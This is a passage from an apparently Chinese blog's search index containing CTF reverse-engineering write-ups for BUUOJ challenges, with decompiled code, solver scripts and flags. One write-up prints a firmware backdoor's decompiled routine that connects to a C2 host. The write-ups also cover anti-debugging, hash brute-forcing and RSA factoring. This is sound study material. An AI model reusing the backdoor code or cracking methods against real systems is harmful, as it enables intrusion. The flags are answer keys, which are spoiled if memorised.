a2[v6] = 34; v8 = (a2[v6] | 0x20) - 87; &#125; else &#123; v8 = ((a2[v6] | 0x20) - 97) % 6 + 10; &#125; __rdtsc(); __rdtsc(); v9 = v8 + 16 * v9; if ( !((int)(v6 + 1) % 2) ) &#123; *(&amp;v14 + v3++) = v9; v9 = 0; &#125; ++v6; &#125; while ( v5 &lt; 8 ) &#123; v10 += byte_416050[++v11]; v12 = byte_416050[v11]; v7 = byte_416050[v10]; byte_416050[v10] = v12; byte_416050[v11] = v7; if ( ((int)NtCurrentPeb()-&gt;UnicodeCaseTableData &amp; 0x70) != 0 ) v12 = v10 + v11; *(&amp;v16 + v5) = byte_416050[(unsigned __int8)(v7 + v12)] ^ *(&amp;v14 + v4); if ( (unsigned __int8)*(_DWORD *)&amp;NtCurrentPeb()-&gt;BeingDebugged ) &#123; v10 = 0xAD; v11 = 43; &#125; sub_401710(&amp;v16, a1, v5++); v4 = v5; if ( v5 &gt;= (unsigned int)(&amp;v14 + strlen(&amp;v14) + 1 - v15) ) v4 = 0; &#125; v13 = 0; sub_401470(&amp;v16, &amp;v13); return v13 == 0xAB94;&#125; 这个函数使用了PEB来进行反调试, 具体情况可以看这个文章 Reverse_PEB 第一部分的while循环用于将密码转为十六进制字符串得到v14 第二部分的while循环用于加密 加密结果v16需要经过函数sub_401470的校验, 要求的v16=&quot;dbappsec&quot; *(&amp;v16 + v5) = byte_416050[(unsigned __int8)(v7 + v12)] ^ *(&amp;v14 + v4); v16已知, 只需要得到byte_416050, 但是用于加密的byte_416050会在加密之前进行一系列的操作 可以使用动调的方法, 得到真正用于加密的数据 1.text:00401B3E xor eax, ecx Debugger中在这条语句下断点, ECX即为所需的数据 123456789#!/usr/bin/env python3import hashlib_416050 = [0x2A, 0xD7, 0x92, 0xE9, 0x53, 0xE2, 0xE4, 0xCD]v17 = &quot;dbappsec&quot;passwd = &quot;&quot;for _ in range(len(v17)): passwd += hex(ord(v17[_])^_416050[_])[2:]flag = &quot;flag&#123;&quot; + hashlib.md5(passwd.encode()).hexdigest() + &quot;&#125;&quot;print(flag) flag{43097184c2f63f7bcabdadf21b693c8e} [ACTF新生赛2020]Oruga 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]Oruga ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 result; // rax int i; // [rsp+0h] [rbp-40h] char s1[6]; // [rsp+4h] [rbp-3Ch] BYREF char s2[6]; // [rsp+Ah] [rbp-36h] BYREF char s[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(40u); memset(s, 0, 25uLL); printf(&quot;Tell me the flag:&quot;); scanf(&quot;%s&quot;, s); strcpy(s2, &quot;actf&#123;&quot;); for ( i = 0; i &lt;= 4; ++i ) s1[i] = s[i]; s1[5] = 0; if ( !strcmp(s1, s2) ) &#123; if ( sub_78A((__int64)s) ) printf(&quot;That&#x27;s True Flag!&quot;); else printf(&quot;don&#x27;t stop trying...&quot;); result = 0LL; &#125; else &#123; printf(&quot;Format false!&quot;); result = 0LL; &#125; return result;&#125; 函数sub_78A用于校验flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152_BOOL8 __fastcall sub_78A(__int64 a1)&#123; int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int v4; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; v4 = 0; while ( byte_201020[v2] != 0x21 ) &#123; v2 -= v4; if ( *(_BYTE *)(v3 + a1) != &#x27;W&#x27; || v4 == -16 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;E&#x27; || v4 == 1 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;M&#x27; || v4 == 16 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;J&#x27; || v4 == -1 ) return 0LL; v4 = -1; &#125; else &#123; v4 = 16; &#125; &#125; else &#123; v4 = 1; &#125; &#125; else &#123; v4 = -16; &#125; ++v3; while ( !byte_201020[v2] ) &#123; if ( v4 == -1 &amp;&amp; (v2 &amp; 0xF) == 0 ) return 0LL; if ( v4 == 1 &amp;&amp; v2 % 16 == 15 ) return 0LL; if ( v4 == 16 &amp;&amp; (unsigned int)(v2 - 240) &lt;= 15 ) return 0LL; if ( v4 == -16 &amp;&amp; (unsigned int)(v2 + 15) &lt;= 30 ) return 0LL; v2 += v4; &#125; &#125; return *(_BYTE *)(v3 + a1) == &#x27;&#125;&#x27;;&#125; byte_201020如下 1234567891011121314151617_416050 = [0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x23, 0x23, 0x23, 0x00, 0x00, 0x00, 0x23, 0x23, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45, 0x00, 0x00, 0x00, 0x30, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45, 0x54, 0x54, 0x54, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x21, 0x00, 0x00, 0x00, 0x45, 0x45] 结合上面的代码可以知道是个迷宫题 特别之处在于会按照给定方向一直走, 直到遇到非0数据 flag{MEWEMEWJMEWJM} [FlareOn3]Challenge1 链接: https://buuoj.cn/challenges#[FlareOn3]Challenge1 EXE 32 IDA中 _main 函数反编译结果如下 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char Buffer[128]; // [esp+0h] [ebp-94h] BYREF char *Str1; // [esp+80h] [ebp-14h] char *Str2; // [esp+84h] [ebp-10h] HANDLE v7; // [esp+88h] [ebp-Ch] HANDLE hFile; // [esp+8Ch] [ebp-8h] DWORD NumberOfBytesWritten; // [esp+90h] [ebp-4h] BYREF hFile = GetStdHandle(0xFFFFFFF5); v7 = GetStdHandle(0xFFFFFFF6); Str2 = &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;; WriteFile(hFile, &quot;Enter password:\\r\\n&quot;, 0x12u, &amp;NumberOfBytesWritten, 0); ReadFile(v7, Buffer, 128u, &amp;NumberOfBytesWritten, 0); Str1 = (char *)sub_401260(Buffer, NumberOfBytesWritten - 2); if ( !strcmp(Str1, Str2) ) WriteFile(hFile, &quot;Correct!\\r\\n&quot;, 0xBu, &amp;NumberOfBytesWritten, 0); else WriteFile(hFile, &quot;Wrong password\\r\\n&quot;, 0x11u, &amp;NumberOfBytesWritten, 0); return 0;&#125; 跟进函数sub_401260可以看到一个Base64表 Base64替换 12345678910#!/usr/bin/env python3import base64 table1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;table2 = &quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;cipher = &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;_flag = &quot;&quot;for _ in cipher: _flag += table1[table2.index(_)]flag = base64.b64decode(_flag)print(flag) flag{sh00ting_phish_in_a_barrel@flare-on.com} firmware 链接: https://buuoj.cn/challenges#firmware Firmware 1234567891011binwalk 51475f91-7b90-41dd-81a3-8b82df4f29d0.bin DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 TP-Link firmware header, firmware version: 1.-20432.3, image version: &quot;&quot;, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 069424 0x10F30 Certificate in DER format (x509 v3), header length: 4, sequence length: 6494080 0x16F80 U-Boot version string, &quot;U-Boot 1.1.4 (Aug 26 2013 - 09:07:51)&quot;94256 0x17030 CRC32 polynomial table, big endian131584 0x20200 TP-Link firmware header, firmware version: 0.0.3, image version: &quot;&quot;, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 00132096 0x20400 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2203728 bytes1180160 0x120200 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2774624 bytes, 519 inodes, blocksize: 131072 bytes, created: 2015-04-13 09:35:04 题目中所提到的Backdoor应该就在Squashfs filesystem中 binwalk分离文件, 但是unsquashfs命令不能解压缩这个文件系统 需要使用firmware-mod-kit https://github.com/rampageX/firmware-mod-kit/ 用g++10编译源码的时候有点问题, 需要修改下源码 mksquashfs.c中某些函数或变量没有加static造成的重复定义问题 某部分代码少包含了&lt;sys/sysmacros.h&gt; 1./unsquashfs_all.sh 120200.squashfs 在tmp中找到backdoor IDA中 initConnection 函数反编译结果如下 123456789101112131415161718192021222324252627bool initConnection()&#123; char *v0; // r0 char s[512]; // [sp+4h] [bp-208h] BYREF int v3; // [sp+204h] [bp-8h] memset(s, 0, sizeof(s)); if ( mainCommSock ) &#123; close(mainCommSock); mainCommSock = 0; &#125; if ( currentServer ) ++currentServer; else currentServer = 0; strcpy(s, (&amp;commServer)[currentServer]); v3 = 36667; if ( strchr(s, &#x27;:&#x27;) ) &#123; v0 = strchr(s, &#x27;:&#x27;); v3 = atoi(v0 + 1); *strchr(s, 58) = 0; &#125; mainCommSock = socket(2, 1, 0); return connectTimeout(mainCommSock, (int)s, v3, 30) == 0;&#125; 可以得到C2 12echo -n &quot;echo.byethost51.com:36667&quot; | md5sum33a422c45d551ac6e4756f59812a954b flag{33a422c45d551ac6e4756f59812a954b} [Zer0pts2020]easy strcmp 链接: https://buuoj.cn/challenges#[Zer0pts2020]easy strcmp ELF 64 IDA中 main 函数反编译结果如下 123456789101112131415__int64 __fastcall main(int a1, char **a2, char **a3)&#123; if ( a1 &gt; 1 ) &#123; if ( !strcmp(a2[1], byte_8E0) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); &#125; else &#123; printf(&quot;Usage: %s &lt;FLAG&gt;\\n&quot;, *a2); &#125; return 0LL;&#125; 看到一个可疑的函数 12345678910111213__int64 __fastcall sub_6EA(__int64 a1, __int64 a2)&#123; int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) ; v4 = (i &gt;&gt; 3) + 1; for ( j = 0; j &lt; v4; ++j ) *(_QWORD *)(8 * j + a1) -= qword_201060[j]; return qword_201090(a1, a2);&#125; 虽然main函数中没有调用这个函数, 在IDA中在这个函数下断点, 可以看到输入的内容被进行运算, 大概是hook 1qword_201060 = [0x0, 0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B,0x0] IDA中qword_201060所展示出的数据为大端 而字符串&quot;zer0pts&#123;********CENSORED********&#125;&quot;为小端 所以需要在计算之前要先转为大端 1234567891011#!/usr/bin/env python3from Crypto.Util.number import *_201060 = [0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B]cipher = &quot;********CENSORED********&quot;flag = &quot;flag&#123;&quot;for i in range(3): c = cipher[8*i:8*i+8].encode()[::-1] plain = bytes_to_long(c) flag += long_to_bytes(plain + _201060[i]).decode()[::-1]flag += &quot;&#125;&quot;print(flag) flag{l3ts_m4k3_4_DETOUR_t0d4y} [ACTF新生赛2020]Universe_final_answer 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]Universe_final_answer ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920__int64 __fastcall main(int a1, char **a2, char **a3)&#123; char v4[32]; // [rsp+0h] [rbp-A8h] BYREF char v5[104]; // [rsp+20h] [rbp-88h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-20h] v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)&quot;Please give me the key string:&quot;, (__int64)a3); scanf(&quot;%s&quot;, v5); if ( sub_860(v5) ) &#123; sub_C50(v5, v4); __printf_chk(1LL, (__int64)&quot;Judgement pass! flag is actf&#123;%s_%s&#125;\\n&quot;, (__int64)v5); &#125; else &#123; puts(&quot;False key!&quot;); &#125; return 0LL;&#125; 跟进sub_860 1234567891011121314151617181920212223242526272829303132333435363738394041bool __fastcall sub_860(char *a1)&#123; int b1; // ecx int b0; // esi int b2; // edx int b3; // er9 int b4; // er11 int b6; // ebp int b5; // ebx int b7; // er8 int b8; // er10 bool result; // al int b9; // [rsp+0h] [rbp-38h] b1 = a1[1]; b0 = *a1; b2 = a1[2]; b3 = a1[3]; b4 = a1[4]; b6 = a1[6]; b5 = a1[5]; b7 = a1[7]; b8 = a1[8]; result = 0; if ( -85 * b8 + 58 * b7 + 97 * b6 + b5 + -45 * b4 + 84 * b3 + 95 * b0 - 20 * b1 + 12 * b2 == 12613 ) &#123; b9 = a1[9]; if ( 30 * b9 + -70 * b8 + -122 * b6 + -81 * b5 + -66 * b4 + -115 * b3 + -41 * b2 + -86 * b1 - 15 * b0 - 30 * b7 == -54400 &amp;&amp; -103 * b9 + 120 * b7 + 108 * b5 + 48 * b3 + -89 * b2 + 78 * b1 - 41 * b0 + 31 * b4 - (b6 &lt;&lt; 6) - 120 * b8 == -10283 &amp;&amp; 71 * b6 + (b5 &lt;&lt; 7) + 99 * b4 + -111 * b2 + 85 * b1 + 79 * b0 - 30 * b3 - 119 * b7 + 48 * b8 - 16 * b9 == 22855 &amp;&amp; 5 * b9 + 23 * b8 + 122 * b7 + -19 * b6 + 99 * b5 + -117 * b4 + -69 * b2 + 22 * b1 - 98 * b0 + 10 * b3 == -2944 &amp;&amp; -54 * b9 + -23 * b7 + -82 * b2 + -85 * b0 + 124 * b1 - 11 * b3 - 8 * b4 - 60 * b5 + 95 * b6 + 100 * b8 == -2222 &amp;&amp; -83 * b9 + -111 * b5 + -57 * b0 + 41 * b1 + 73 * b2 - 18 * b3 + 26 * b4 + 16 * b6 + 77 * b7 - 63 * b8 == -13258 &amp;&amp; 81 * b9 + -48 * b8 + 66 * b7 + -104 * b6 + -121 * b5 + 95 * b4 + 85 * b3 + 60 * b2 + -85 * b0 + 80 * b1 == -1559 &amp;&amp; 101 * b9 + -85 * b8 + 7 * b6 + 117 * b5 + -83 * b4 + -101 * b3 + 90 * b2 + -28 * b1 + 18 * b0 - b7 == 6308 ) &#123; result = 99 * b9 + -28 * b8 + 5 * b7 + 93 * b6 + -18 * b5 + -127 * b4 + 6 * b3 + -9 * b2 + -93 * b1 + 58 * b0 == -1697; &#125; &#125; return result;&#125; sage解线性方程即可 1234567891011121314151617#!/usr/bin/env python3b = Matrix([[12613], [-54400], [-10283], [22855], [-2944], [-2222], [-13258], [-1559], [6308], [-1697]])x = Matrix([[95, -20, 12, 84, -45, 1, 97, 58, -85, 0], [-15, -86, -41, -115, -66, -81, -122, -30, -70, 30], [-41, 78, -89, 48, 31, 108, -64, 120, -120, -103], [79, 85, -111, -30, 99, 128, 71, -119, 48, -16], [-98, 22, -69, 10, -117, 99, -19, 122, 23, 5], [-85, 124, -82, -11, -8, -60, 95, -23, 100, -54], [-57, 41, 73, -18, 26, -111, 16, 77, -63, -83], [-85, 80, 60, 85, 95, -121, -104, 66, -48, 81], [18, -28, 90, -101, -83, 117, 7, -1, -85, 101], [58, -93, -9, 6, -127, -18, 93, 5, -28, 99,]]).solve_right(b)key = &quot;&quot;for _ in x: key += chr(_[0])print(key) 得到key=&quot;F0uRTy_7w@&quot;, 在程序中输入key即可得到flag flag{F0uRTy_7w@_42} [UTCTF2020]basic-re 链接: https://buuoj.cn/challenges#[UTCTF2020]basic-re ELF 64 数据部分即可看到flag flag{str1ngs_1s_y0ur_fr13nd} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Reverse_1","slug":"Reverse-1","date":"2021-05-18T01:46:26.000Z","updated":"2021-05-22T11:14:32.000Z","comments":true,"path":"2021/05/17/Reverse-1/","link":"","permalink":"https://yoloyolo.top/2021/05/17/Reverse-1/","excerpt":"虽然闲着但是不想让自己闲着, 先刷完BUUOJ的第一页逆向吧","text":"虽然闲着但是不想让自己闲着, 先刷完BUUOJ的第一页逆向吧 [BJDCTF2020]JustRE 链接: https://buuoj.cn/challenges#[BJDCTF2020]JustRE EXE 32 IDA中 DialogFunc 函数反编译结果如下 123456789101112131415161718192021222324BOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)&#123; CHAR String; // [esp+0h] [ebp-64h] if ( a2 != 272 ) &#123; if ( a2 != 273 ) return 0; if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 ) &#123; sprintf(&amp;String, aD, ++dword_4099F0); if ( dword_4099F0 == 19999 ) &#123; sprintf(&amp;String, aBjdDD2069a4579, 19999, 0); SetWindowTextA(hWnd, &amp;String); return 0; &#125; SetWindowTextA(hWnd, &amp;String); return 0; &#125; EndDialog(hWnd, (unsigned __int16)a3); &#125; return 1;&#125; aD = &quot;您已经点了 %d 次&quot; dword_4099F0 = 0 aBjdDD2069a4579 = &quot;BJD&#123;%d%d2069a45792d233ac&#125;&quot; 当计数到达19999之后得到flag, 用19999和0分别替换两个%d即为flag flag{1999902069a45792d233ac} rsa 链接: https://buuoj.cn/challenges#rsa 这题放错分类了吧… 使用openssl从公钥文件中提取e, n 123456789openssl rsa -pubin -modulus -text -in pub.key RSA Public-Key: (256 bit)Modulus: 00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42: 33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3: 41:cc:ddExponent: 65537 (0x10001)Modulus=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDwriting RSA key e = 0x10001 n = 0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD http://www.factordb.com/index.php 在这个网站分解n得到两个素数 p = 285960468890451637935629440372639283459 q = 304008741604601924494328155975272418463 12345678910111213#!/usr/bin/env python3from Crypto.Util.number import *p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463e = 65537n = p * qphi = (p - 1)*(q - 1)d = inverse(e, phi)import rsakey = rsa.PrivateKey(n,e,d,p,q)c = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()print(rsa.decrypt(c,key)) flag{decrypt_256} CrackRTF 链接: https://buuoj.cn/challenges#CrackRTF EXE 32 IDA中 _main_0 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int __cdecl main_0()&#123; DWORD v0; // eax DWORD v1; // eax CHAR String; // [esp+4Ch] [ebp-310h] int v4; // [esp+150h] [ebp-20Ch] CHAR String1; // [esp+154h] [ebp-208h] BYTE pbData; // [esp+258h] [ebp-104h] memset(&amp;pbData, 0, 0x104u); memset(&amp;String1, 0, 0x104u); v4 = 0; printf(&quot;pls input the first passwd(1): &quot;); scanf(&quot;%s&quot;, &amp;pbData); if ( strlen((const char *)&amp;pbData) != 6 ) &#123; printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); &#125; v4 = atoi((const char *)&amp;pbData); if ( v4 &lt; 100000 ) ExitProcess(0); strcat((char *)&amp;pbData, &quot;@DBApp&quot;); v0 = strlen((const char *)&amp;pbData); sub_40100A(&amp;pbData, v0, &amp;String1); if ( !_strcmpi(&amp;String1, &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;) ) &#123; printf(&quot;continue...\\n\\n&quot;); printf(&quot;pls input the first passwd(2): &quot;); memset(&amp;String, 0, 0x104u); scanf(&quot;%s&quot;, &amp;String); if ( strlen(&amp;String) != 6 ) &#123; printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); &#125; strcat(&amp;String, (const char *)&amp;pbData); memset(&amp;String1, 0, 0x104u); v1 = strlen(&amp;String); sub_401019((BYTE *)&amp;String, v1, &amp;String1); if ( !_strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;, &amp;String1) ) &#123; if ( !(unsigned __int8)sub_40100F(&amp;String) ) &#123; printf(&quot;Error!!\\n&quot;); ExitProcess(0); &#125; printf(&quot;bye ~~\\n&quot;); &#125; &#125; return 0;&#125; 输入的第一个密码要求为六位字符 函数atoi则是将字符串转为数字 则第一个密码需要输入六位数字 跟进到函数sub_401230 使用函数CryptCreateHash 第二个参数为所使用的加密算法 https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id 通过这个文档可以得知0x8003为md5, 0x8004为sha1 所以可以爆破第一段hash 12345678#!/usr/bin/env python3import hashlibpasswd = b&quot;&quot;for _ in range(100000, 1000000): test = str(_).encode()+b&quot;@DBApp&quot; if hashlib.sha1(test).hexdigest() == &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;: print(passwd) break 123321@DBApp 而对于第二段的md5加密结果, 没有作输入字符集的限定, 比较难以爆破 https://www.somd5.com/ 通过这个链接可以得到md5的明文 ~!3a@0123321@DBApp 其实完全没必要爆破sha1, 直接在somd5查明文就能解题了 而后续的RTF操作有些复杂, 这里可以通过运行程序输入密码来得到flag flag{N0_M0re_Free_Bugs} [ACTF新生赛2020]easyre 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]easyre EXE 32 存在UPX壳, 脱壳后IDA中 _main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+12h] [ebp-2Eh] char c1[12]; char v5; // [esp+13h] [ebp-2Dh] char v6; // [esp+14h] [ebp-2Ch] char v7; // [esp+15h] [ebp-2Bh] char v8; // [esp+16h] [ebp-2Ah] char v9; // [esp+17h] [ebp-29h] char v10; // [esp+18h] [ebp-28h] char v11; // [esp+19h] [ebp-27h] char v12; // [esp+1Ah] [ebp-26h] char v13; // [esp+1Bh] [ebp-25h] char v14; // [esp+1Ch] [ebp-24h] char v15; // [esp+1Dh] [ebp-23h] c1 end int v16; // [esp+1Eh] [ebp-22h] int i1[3]; int v17; // [esp+22h] [ebp-1Eh] int v18; // [esp+26h] [ebp-1Ah] i1 end __int16 v19; // [esp+2Ah] [ebp-16h] char c2[18]; char v20; // [esp+2Ch] [ebp-14h] char v21; // [esp+2Dh] [ebp-13h] char v22; // [esp+2Eh] [ebp-12h] int v23; // [esp+2Fh] [ebp-11h] int i2[3]; int v24; // [esp+33h] [ebp-Dh] int v25; // [esp+37h] [ebp-9h] i2 end char v26; // [esp+3Bh] [ebp-5h] c2 end int i; // [esp+3Ch] [ebp-4h] __main(); v4 = &#x27;*&#x27;; v5 = &#x27;F&#x27;; v6 = &#x27;\\&#x27;&#x27;; v7 = &#x27;&quot;&#x27;; v8 = &#x27;N&#x27;; v9 = &#x27;,&#x27;; v10 = &#x27;&quot;&#x27;; v11 = &#x27;(&#x27;; v12 = &#x27;I&#x27;; v13 = &#x27;?&#x27;; v14 = &#x27;+&#x27;; v15 = &#x27;@&#x27;; printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, &amp;v19); if ( (_BYTE)v19 != &#x27;A&#x27; || HIBYTE(v19) != &#x27;C&#x27; || v20 != &#x27;T&#x27; || v21 != &#x27;F&#x27; || v22 != &#x27;&#123;&#x27; || v26 != &#x27;&#125;&#x27; ) return 0; v16 = v23; v17 = v24; v18 = v25; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( *(&amp;v4 + i) != _data_start__[*((char *)&amp;v16 + i) - 1] ) return 0; &#125; printf(&quot;You are correct!&quot;); return 0;&#125; 这里值得一提的是, char c2[18]中插入了一个int i2[3], 而int使用4Byte, char使用1Byte, 弄清楚内存大小对应关系即可 v16,v17,v18对应v23,v24,v25, 即flag[5:18] *((char *)&amp;v16 + i) 意为用char指针去访问v16的内存, 每次读取一个字节, 实际上是读取flag[5:18] 1_data_start__ == &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot; 12345678#!/usr/bin/env python3data = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot;string1 = &quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;flag = &quot;flag&#123;&quot;for _ in string1: flag += chr(data.index(_)+1)flag += &quot;&#125;&quot;print(flag) flag{U9X_1S_W6@T?} [2019红帽杯]easyRE 链接: https://buuoj.cn/challenges#[2019红帽杯]easyRE ELF 64 IDA中函数 sub_4009C6 的反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148signed __int64 sub_4009C6()&#123; signed __int64 result; // rax __int64 v1; // ST10_8 __int64 v2; // ST18_8 __int64 v3; // ST20_8 __int64 v4; // ST28_8 __int64 v5; // ST30_8 __int64 v6; // ST38_8 __int64 v7; // ST40_8 __int64 v8; // ST48_8 __int64 v9; // ST50_8 __int64 v10; // ST58_8 int i; // [rsp+Ch] [rbp-114h] char v12; // [rsp+60h] [rbp-C0h] char c1[36]; char v13; // [rsp+61h] [rbp-BFh] char v14; // [rsp+62h] [rbp-BEh] char v15; // [rsp+63h] [rbp-BDh] char v16; // [rsp+64h] [rbp-BCh] char v17; // [rsp+65h] [rbp-BBh] char v18; // [rsp+66h] [rbp-BAh] char v19; // [rsp+67h] [rbp-B9h] char v20; // [rsp+68h] [rbp-B8h] char v21; // [rsp+69h] [rbp-B7h] char v22; // [rsp+6Ah] [rbp-B6h] char v23; // [rsp+6Bh] [rbp-B5h] char v24; // [rsp+6Ch] [rbp-B4h] char v25; // [rsp+6Dh] [rbp-B3h] char v26; // [rsp+6Eh] [rbp-B2h] char v27; // [rsp+6Fh] [rbp-B1h] char v28; // [rsp+70h] [rbp-B0h] char v29; // [rsp+71h] [rbp-AFh] char v30; // [rsp+72h] [rbp-AEh] char v31; // [rsp+73h] [rbp-ADh] char v32; // [rsp+74h] [rbp-ACh] char v33; // [rsp+75h] [rbp-ABh] char v34; // [rsp+76h] [rbp-AAh] char v35; // [rsp+77h] [rbp-A9h] char v36; // [rsp+78h] [rbp-A8h] char v37; // [rsp+79h] [rbp-A7h] char v38; // [rsp+7Ah] [rbp-A6h] char v39; // [rsp+7Bh] [rbp-A5h] char v40; // [rsp+7Ch] [rbp-A4h] char v41; // [rsp+7Dh] [rbp-A3h] char v42; // [rsp+7Eh] [rbp-A2h] char v43; // [rsp+7Fh] [rbp-A1h] char v44; // [rsp+80h] [rbp-A0h] char v45; // [rsp+81h] [rbp-9Fh] char v46; // [rsp+82h] [rbp-9Eh] char v47; // [rsp+83h] [rbp-9Dh] c1 end char v48[32]; // [rsp+90h] [rbp-90h] int v49; // [rsp+B0h] [rbp-70h] char v50; // [rsp+B4h] [rbp-6Ch] char v51; // [rsp+C0h] [rbp-60h] char v52; // [rsp+E7h] [rbp-39h] char v53; // [rsp+100h] [rbp-20h] unsigned __int64 v54; // [rsp+108h] [rbp-18h] v54 = __readfsqword(0x28u); v12 = 73; v13 = 111; v14 = 100; v15 = 108; v16 = 62; v17 = 81; v18 = 110; v19 = 98; v20 = 40; v21 = 111; 